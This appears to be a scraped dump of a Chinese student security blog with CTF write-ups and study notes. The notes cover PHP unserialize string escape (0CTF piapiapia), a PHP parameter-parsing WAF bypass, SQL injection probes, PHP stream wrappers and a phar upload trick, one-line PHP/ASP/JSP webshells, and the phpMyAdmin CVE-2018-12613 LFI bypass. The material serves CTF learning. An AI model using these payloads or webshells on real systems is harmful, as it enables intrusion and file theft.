然后输出一看一串奇怪的数字16843009。。 12345678910#include&lt;bits/stdc++.h&gt;using namespace std;int main() &#123; int a[10]; memset(a,1,sizeof(a)); for(int i=0;i&lt;10;i++) cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; return 0;&#125; what happened?首先要知道memset在哪，在string.h头文件里面。memset是按字节赋值，int4字节，memset(dp,1,sizeof(dp))这句话的意思就是把每个int型的dp的每个字节都赋值为00000001，那么每个int型dp元素的值为：00000001 00000001 00000001 00000001，转换成十进制就是16843009。那为什么赋值0或者-1没错？因为0的补码是00000000，-1的补码是11111111，再翻译回去还是0和-1。所以除了0和-1赋值的话可以用fill。比如fill(a,a+n,1)这样就可以把数组a的每一个元素的值都赋值为1了。","categories":[],"tags":[{"name":"c++","slug":"c","permalink":"https://polosec.github.io/tags/c/"}]},{"title":"二层交换and三层交换","slug":"二层交换and三层交换","date":"2020-04-20T12:31:24.000Z","updated":"2020-04-20T14:10:10.080Z","comments":true,"path":"2020/04/20/二层交换and三层交换/","link":"","permalink":"https://polosec.github.io/2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/","excerpt":"","text":"二层交换与三层交换的问题其实是偶然看到的，看某校夏令营经验贴看到有提问这个问题，正好我不会，记录一下。参考链接：https://zhuanlan.zhihu.com/p/64455461https://blog.csdn.net/Apollon_krj/article/details/82086174https://blog.csdn.net/lycb_gz/article/details/8780851二层交换机工作在数据链路层，根据MAC地址对帧进行转发；三层交换机工作在网络层，对于跨网段的通信，可以做到一次路由，多次交换。 用到的知识点在说二三层转发之前先总结一下用到的知识点，虽然我学过一遍计算机网络，但自认为学的很菜。。有些地方都忘了。。甚至某协议首部某字段还没记住233331.ARPARP协议是由IP地址获得MAC地址，假设两台主机在同一网段，A向B发消息，A知道B的IP地址 但是不知道B的mac地址，所以在局域网内发个广播，目的MAC全为F，意思就是：“谁的IP地址为192.168.2.2？赶紧把mac地址告诉我”局域网内其他主机看到这条消息后发现目的ip不是自己的，于是丢弃；B看到后发现是找的自己，于是把自己的mac地址发给了A，于此同时B在自己的ARP表中记录下A的IP与MAC地址的映射关系。A收到B发的消息后也把B的IP与MAC的映射关系记录到自己的ARP表中。。这就是一次简单的ARP请求2.跨网段通信假设A和B不在一个网段，通信过程应该是这样：先和子网掩码相与，发现不在一个网段，然后找自己的网关，把数据发给网关让网关代为转发；在这个过程中如果不知道网关的MAC就来一次ARP。发送给网关后，查一下路由表，看看下一跳该发到哪了，就这样一直转发，查找下一跳，转发。。无限套娃。套到最后节点，发现目的IP在自己的网段，先看看ARP表有没有记录，没有的话发一次ARP请求，有的话就直接把请求发给目的IP了。3.ARP表 mac表二层交换机维护MAC表，主机维护ARP表 二层交换二层交换是数据链路层的交换，根据mac地址交换。二层交换通信不能跨网段（比如vlan）。二层交换机维护的MAC表是端口和MAC地址的映射关系。 三层交换三层交换又被叫做一次路由，多次交换。这是啥意思？先说一个简单的：假设一台三层交换机划分了vlan1和vlan2，a在vlan1，b在vlan2，a第一次给b发数据的时候还是正常走路由表，等整个过程结束后三层交换机会记录下一条数据，包括了A和B的mac地址端口等相关信息，下次A和B通信的时候直接根据这条数据通过二层转发了，就不用再走路由了。of course,事情没有那么简单，too simple,sometimes naive!上面这句话就图一乐，就像面试问TCP 三次握手的时候你说“客户端发请求，服务器响应，客户端再发一个请求，建立连接。”一样，太不专业了。好的 接下来说个复杂的。 三层交换跨网段通信主机A和B在同一个交换机，但是在不同vlan。观察a和b的通信过程初始化，a发现b和自己不一个网段并且不知道网关的mac，广播一个ARP，目的是找到网关的MAC。网关收到ARP请求后把自己的mac地址发给a，并且在自己的arp表中记录a端口和mac的映射关系。然后把A的IP地址（作为“目的IP地址”）、MAC地址（作为“下一跳MAC地址”），以及与交换机直接相连的端口号等信息下发到三层交换机ASIC芯片中的三层硬件转发表。此时在三层硬件转发表中就有了第一个转发表项，即A的转发表项。A收到网关的应答后，把目的地址修改问网关的mac，并且把数据包发给网关网关收到请求后，先在三层硬件转发表中查找与B有关表项，由于是第一次通信，所以没有，然后进行路由。CPU根据目的地址在router table中查找next hop，发现了直连的主机b，然后在自己的arp表中查b的mac，没有查到，于是发个广播：找B的mac。B收到ARP请求后把自己的mac发给交换机，自己也缓存下。交换机收到b的mac后，在自己的arp表中记录下ip与mac的映射；在三层硬件转发表中新增一项： B的IP地址、MAC地址、进入交换机的端口号等信息。这样就完成了第一次A和B的通信，三层交换机的硬件转发表中多了两项：分别是A的IP A的port A的mac A的vlan 。。。B的IP B的PORT B的MAC B的VLAN 。。。等下次有别的主机想和A或者B通信的时候，由于表中有记录，直接走表中记录的端口转发过去就可以了。即 一次路由，多次交换~（首尾呼应2333 arp全0和全f的问题在网络层的ARP协议（TCP/IP模型）不知道目的mac，所以把目的mac置0；到了数据链路层置为全F 意为广播帧–数据链路层不认识ip。如果有错误欢迎提出，共同进步","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"php unserialize","slug":"php-unserialize","date":"2020-04-17T08:44:47.000Z","updated":"2020-04-17T15:49:48.235Z","comments":true,"path":"2020/04/17/php-unserialize/","link":"","permalink":"https://polosec.github.io/2020/04/17/php-unserialize/","excerpt":"","text":"php unserialize之前没怎么接触过PHP反序列化的问题，这两天碰巧做了一道往年的题，遇到了，算是初步了解了PHP反序列化的问题，记录一下解决思路题目链接：https://buuoj.cn/login?next=%2Fchallenges%3F#%5B0CTF%202016%5Dpiapiapia 环境探测PHP版本5.6 没有发现其他有用信息用扫描器扫了一下发现了网站备份，下载下来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phpclass.phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt;update.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 阅读源码后发现其资料更新流程是这样的：在update.php点击更新资料后，在本页面处理，经过正则表达式过滤后通过的话，在user类中的update_profile方法中执行序列化后的profile$user-&gt;update_profile($username, serialize($profile));跟进user-&gt;update_profile方法：用户名和资料经过过滤器fileter过滤后直接丢给mysql更新,继续跟进filter主要是正则替换。把危险字段替换为“hacker”。这里有问题。暂时不管，继续跟进。顺利通过filter后则可顺利更新用户资料。再看profile.php里面这句话:$photo = base64_encode(file_get_contents($profile[‘photo’]));file_get_contents 是不是想到了什么？伪协议？我们想读取到的文件是config.php 因为里面已经提示了有flag字段。接下来我们要做的是让file_get_contents()包含config.php这个文件先自己尝试下替换文件名，失败了。接下来考虑伪协议，也失败了。。然后考虑反序列化的问题首先明白什么是反序列化个人理解反序列化就是把对象，变量，各种属性不一的文件通过一种形式的转换转换成字符串（序列化），并且还能通过该字符串还原该对象（反序列化）一个例子就是ss导出配置的时候给他base64解密看看是不是序列化的思想呢2333举个栗子 反序列化严格按照长度进行反序列化，如果长度改变的话可能反序列化失败。比如： 在反序列化之前，我把最后一个字符串加了一个d 但是前面的长度还是5没有变，所以反序列化失败了，报错。还有一种情况：通过自己构造的反序列化对象，可以修改对象的某些属性。比如之前c的最后一个字符串为234，我们构造$c1=’a:3:{i:0;s:3:”123”;i:1;s:3:”abc”;i:2;s:5:”wdnmd”;}”;i:2;s:3:”234”;}’;就把最后一个属性的值换成了wdnmd，后面原来的字符串会被忽略。起到了夹带私货的作用。 这道题我们想让photo的值为config.php,所以需要利用上面说的字符串逃逸的问题，将payload挤到后面去。具体什么意思？对nickname的内容进行构造，我们知道，序列化之后长度固定不变。就是S:后面的数字。但是问题就出现在他存在一个字符串替换，把where替换成hacker，使得字符串长度+1。那么问题来了，如何利用？首先绕过正则表达式对nickename的判断，用数组就好。nickname[]我们想传入的字符串为 “;}s:5:”photo”;s:10:”config.php”;} 总长度为34，所以我们需要写34个where加上我们想传入的字符串作为payload，总长度为204（包括34个where和想传入的字符串）在经过序列化，过滤的过程中，所有的where被替换成和hacker，这样序列化后的s:204不变，nickname的值变成了34个hacker，并且成功的修改了photo的值为config.phppayload:wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}注意：任何不正确的反序列化是会失败的。In the end:php unserialize的问题有很多，我只是学习到了其中的一个，等学习到了其他的问题继续整理、巩固下来。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"关于apache与php的理解","slug":"关于apache与php的理解","date":"2020-04-13T15:55:18.000Z","updated":"2020-04-14T14:09:58.212Z","comments":true,"path":"2020/04/13/关于apache与php的理解/","link":"","permalink":"https://polosec.github.io/2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"apache与php当客户端请求www.test.com/1.php的时候，apache监听80端口，收到客户端的请求后发现是PHP文件，将该文件先给PHP解释，解释完之后渲染成html给apache服务器，apache再返回给客户端。 vhost与hosts文件hosts文件在本机代表本机dns 格式 IP DOMAIN，位置/Windows/system32/drivers/etc/hosts文件在本机代表本机dnsvhost文件代表了apache配置的虚拟网站。即同一主机的多个网站，需要配置根目录，域名，端口等信息。 1234567891011121314151617181920212223242526272829&lt;VirtualHost *:80&gt; DocumentRoot &quot;E:/phpstudy_pro/WWW/dura.box&quot; ServerName dora.box ServerAlias FcgidInitialEnv PHPRC &quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts&quot; AddHandler fcgid-script .php FcgidWrapper &quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot; .php &lt;Directory &quot;E:/phpstudy_pro/WWW/dura.box&quot;&gt; Options FollowSymLinks ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted DirectoryIndex index.php index.html error/index.html &lt;/Directory&gt; ErrorDocument 400 /error/400.html ErrorDocument 403 /error/403.html ErrorDocument 404 /error/404.html ErrorDocument 500 /error/500.html ErrorDocument 501 /error/501.html ErrorDocument 502 /error/502.html ErrorDocument 503 /error/503.html ErrorDocument 504 /error/504.html ErrorDocument 505 /error/505.html ErrorDocument 506 /error/506.html ErrorDocument 507 /error/507.html ErrorDocument 510 /error/510.html&lt;/VirtualHost&gt; 这里的域名dura.box其实我并没有注册，我这样写只是为了便捷访问。修改本地dns文件，添加记录 127.0.0.1 dura.box 然后cmd ipconfig/flushdns刷新本地dns缓存重启apache服务，下次访问dura.box的时候就相当于访问根目录为E:/phpstudy_pro/WWW/dura.box/的网站。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"20200410学习笔记","slug":"20200410学习笔记","date":"2020-04-10T12:30:38.000Z","updated":"2020-04-14T11:18:07.855Z","comments":true,"path":"2020/04/10/20200410学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天睡了12个小时。。离谱儿。整理一下这两天做的题以及学的内容吧 我这两天睡得这么久是真离谱！！ php strstr()strstr(str1,str2)返回从str2第一次出现开始之后的内容（包括str2)比如 strstr(“phpinput”,”in”)– input php字符串解析bypass前天做了个php字符串解析的问题（buuoj 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__); &#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;); &#125; ?&gt; 直接传num=phpinfo()的话是不行的，有waf。waf的规则如果是规定num只能是数字的话，给num传个字母就白给了。这里就用到了php字符串解析漏洞了。参考链接https://www.freebuf.com/articles/web/213359.html传一个?%20num=phpinfo()的话，waf找不到num这个参数，而php还是可以把%20num识别成num的。所以可以顺利的到eval那。payload: ?%20num=var_dump(scandir(chr(47))) //chr47是/ 代表根目录 找到flag文件 然后file_get_contents(dir+filename)进行读取即可。这里过滤了/，所以用chr(47)代替 mysql if()IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。比如 if(2&gt;1,1,0) mysql 注释#或者– 如果使用–的话后面需要一个间隔符 否则的话会被识别为+号。比如–+ （在url中 +是空格的url编码） sql注入整型、字符型判断参考链接：https://www.cnblogs.com/puhk/p/12674740.html举例:http://xxx/xxx/Less-1/?id=1 and 1=1 –+输入?id=1 and 1=1 –+正常，输入?id=1 and 1=2 –+报错，可判断为整型注入。http://xxx.xxx/Less-1/?id=1&#39;输入?id=1’出现报错,输入?id=1’’正常，可判断为字符型注入。http://xxx.xxx/Less-1/?id=1&#39; and 1=1 – -输入?id=1’ and 1=1 – -正常，输入?id=1’ and 1=2 – -报错，可判断为字符型注入。 mysql盲注初步参考链接 https://www.anquanke.com/post/id/170626盲注分为基于时间的盲注和基于bool的盲注。基于时间的盲注就是根据判断条件返回是true还是false 进行能够判断的操作（比如sleep） 可以理解为一种fuzz。if(substr(database(),1,1)==97,sleep(1),0) 可以写脚本跑出来数据库的名字等等布尔盲注是根据结果返回值（对应true false ）判断需要找的字段 然后进行爆破","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"}]},{"title":"20200408学习笔记","slug":"20200408学习笔记","date":"2020-04-08T15:24:16.000Z","updated":"2020-04-10T15:12:07.675Z","comments":true,"path":"2020/04/08/20200408学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天本来想晚上整理php伪协议的 但是早晨起晚了。。下午起晚了。。晚上弄实验报告的环境弄了一晚上。。太离谱了，明天再详细的写伪协议吧。我今天也起晚了！！废话少说 开始今天的php伪协议总结 参考链接https://www.jianshu.com/p/0a8339fcc269 php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取源代码并进行base64编码输出。eg：php://filter/convert.base64-encode/resource=xxx.phpphp://input: 获取post datafile://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。eg：file:///etc/passwdphar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.phpdata://：需满足allow_url_fopen，allow_url_include同时开启才能使用，使用如下：data://很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入file.php?file=data://text/plain,file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"20200406学习笔记","slug":"20200406学习笔记","date":"2020-04-06T14:37:21.000Z","updated":"2020-04-06T16:21:13.492Z","comments":true,"path":"2020/04/06/20200406学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天又睡了老久。。晚上整理一下其实今天整理这个一方面是不会，另一方面是看到心仪大学夏令营面试有问过这个问题（生日攻击），或许可能不会再问了，但知道总比不知道强！一下内容除webshell和php外皆为生日攻击衍生出来的问题（对我来说没掌握的）今日内容：MD5碰撞√，生日攻击√，哈希√，彩虹表√，盐√，webshell本质，php某方法√，幻数√，内存存储方式√参考：https://www.zhihu.com/question/20820286https://zhuanlan.zhihu.com/p/37165658https://blog.csdn.net/M_mamba/article/details/103405022https://zhuanlan.zhihu.com/p/43994479https://www.jianshu.com/p/732d9d960411https://blog.csdn.net/blade2001/article/details/6341078 hash哈希算法也成为散列算法，可以通过哈希算法单向求得某值。理想情况下，可以正向快速求得该值，并且不能通过该值还原出原数据；原数据即使变化很小，得到的数据变化也比较大。哈希算法可用来验证传输过程中数据是否被篡改。hash算法不理想的情况：存在冲突。即多个原始数据对应一个目标值：h(a)=h(b)=k。在数学上函数必然可逆，且hash函数值域有限，比如128bitMD5的值域为2128=1632(第一次我竟然算错了2333 ,2exp28和32exp16怎么也对不上。我太菜了)哈希算法常见的有：MD5 SHA-1(Secure Hash Algorithm,SHA) SHA-2* SHA512。目前MD5,SHA-1已经不安全。这样可能会导致一些问题，比如在分发session的时候如果用hash计算，如果两用户session值相同的话，会导致越权操作。MD5的长度为128bit，sha1长度为160bit，sha256为256bit,sha512为512bit。 hash冲突处理方法MD5算出来啥就是啥，不知道是不是冲突，此处讨论的冲突是存放的时候的冲突处理！ 开放定址法线性探测法线性补偿探测法线性随机法拉链法多次hash设立公共溢出区幻数与内存存储方式其实内存存储方式是大一学的。。还是比较感谢王老师。。虽然老念ppt，但是问问题还是很热心的帮我解决。谢谢谢谢幻数就是常用的数。MD5的四个幻数ABCD分别是（hex）：A: 01 23 45 67B: 89 ab cd efC: fe dc ba 98D: 76 54 32 10计算机硬件有两种储存数据的方式：大端字节序（big endian）和小端字节序（little endian）。大端字节序：高位字节在前，低位字节在后，这是人类读写数值的方法。小端字节序：低位字节在前，高位字节在后，即以0x1122形式储存。比如用大端字节序存0x01234567的话就是 01 23 45 67小端的话就是 67 45 23 01 生日攻击&amp;&amp;彩虹表&amp;&amp;salt生日问题：一个班级需要有多少人，才能保证每个同学的生日都不一样？答案很出人意料。如果至少两个同学生日相同的概率不超过5%，那么这个班只能有7个人。事实上，一个23人的班级有50%的概率，至少两个同学生日相同；50人班级有97%的概率，70人的班级则是99.9%的概率。由该问题引出的是取值空间与计算哈希值次数和碰撞概率的关系。数学推导我这就不写了。我数学比较菜，当时看了一会才看懂咋回事。。对不起孙老师取值空间为365，70个人中至少两人生日重复的概率为99%。365就是取值空间，70就是哈希计算次数。由生日攻击与哈希碰撞导出的问题是破解哈希值以及如何防御哈希破解。 哈希值破解由于哈希函数是单向的，所以破解方式照理来说应该是暴力破解或者手动算字典的哈希值，建立一个一一对应的关系然后查表。对应方法：1.暴力破解2.字典3.彩虹表这里重点说一下彩虹表，彩虹表并不是单纯的原文-密文一一对应的形式。彩虹表前身–散列链设加密函数为H(X)，则散列链存在一个约简函数R(X)，其定义域和值域与H(X)相反。对于散列链和彩虹表详细的计算过程我还没看太明白，请教完老师再来写。现在已知的是彩虹表是一种中和的方式来破解哈希值。当k越大时，破解时间就越长，但彩虹表所占用的空间就越小；相反，k越小时，彩虹表本身就越大，相应的破解时间就越短。 加salt抵抗彩虹表salt可以是一串随机数。假设原文是abc，不加salt加密后的数据为 DEF，加salt加密后的数据为GKD彩虹表还原出DEF的概率相对加salt后的概率相对大一些。因为对GKD还原后的数据大概率就不是原数据abc了。应用场景：用户注册时：hash(password+salt)-&gt;DB,salt-&gt;DB用户登录时 if(hash_in_db==hash(input_username+salt)) return true; php file_get_contents()file_get_contents()方法把整个文件读入到字符串中。 webshellwebshell是什么，shell是什么？shell是用户与操作系统交互的工具、平台。webshell就是基于web的shell，可以用于网站管理等功能。常见的webshell就是命令执行，比如php的 将这句话写入以PHP为后端的网站后，通过对该文件传参数www.tst.com/1.php?cmd=whoami相当于在shell中执行whoami。当然，也可以用一些webshell管理工具方便操作，比如菜刀，蚁剑。asp一句话： &lt;%eval request(“x”)%&gt; &lt;%execute request(“MH”)%&gt;jsp一句话：&lt;% Runtime.getRuntime().exec(request.getParameter(“shell”)); %&gt;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"密码学","slug":"密码学","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"20200404学习笔记","slug":"20200404学习笔记","date":"2020-04-04T14:17:15.000Z","updated":"2020-04-07T09:00:33.908Z","comments":true,"path":"2020/04/04/20200404学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"缅怀先烈，吾辈当自强。CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )参考链接：https://www.freebuf.com/vuls/176064.html首先分析index.php:在index.php 第56行， 传入的target参数需要满足四个条件：1.是字符串2.不能以index开头3.不在黑名单内4.通过checkPageValidity函数检验，即返回true跟进checkPageValidity函数 1234567891011121314151617181920212223242526272829303132333435public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; 函数分析：如果传入的白名单为空的话，就去找goto_whitelist。如果没有设置page或者page变量不是字符串 返回false。如果page在白名单内，返回true mb_strpos($page . ‘?’, ‘?’)获得page变量?前的长度 注意：’.’用来连接两个字符串 mb_substr 获得[start,end)长度的字符串。 举例如下： 继续分析。 来到 123456789$_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; 将?两次urlencode编码后为%253f。进入php后会自动解码一次，变成%3f，然后再次解码，成功绕过检验。（不双重编码无法绕过的原因为:如果直接给一个?的话,在第一个截取验证中，php会把问号后面的东西当作参数，include的还是db_sql.php。） 所以index.php中的INCLUDE变成了： include db_sql.php%3f(由于php会把db_sql.php%3f当成目录，所以需要多加一个../来跨目录。） 